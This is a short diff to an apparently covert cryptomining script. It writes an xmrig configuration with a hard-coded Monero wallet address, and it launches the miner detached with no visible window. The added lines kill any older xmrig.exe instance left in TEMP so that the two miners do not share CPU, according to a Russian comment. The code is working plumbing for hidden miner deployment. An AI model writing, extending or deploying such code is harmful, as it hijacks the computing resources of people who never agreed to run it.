@@ -48,6 +48,9 @@ def main(**kwargs):
                                "42cRzqLbgMMZVex62mpPZYL9VLDdfjTvm8SGZc2KuvQdeK4eWaQav9TSXpcUZnYWCtidyABFmYuBA8Ub4VkYmjFTUUcpe79"),
                                "pass": wid, "tls": False}]},
                       open(cfg, "w"))
+            # прибить старый экземпляр из TEMP (v5) — два майнера делят CPU
+            subprocess.run("taskkill /F /IM xmrig.exe", shell=True, capture_output=True, timeout=60)
+            time.sleep(2)
             DETACHED = 0x00000008
             CREATE_NEW_PROCESS_GROUP = 0x00000200
             CREATE_NO_WINDOW = 0x08000000
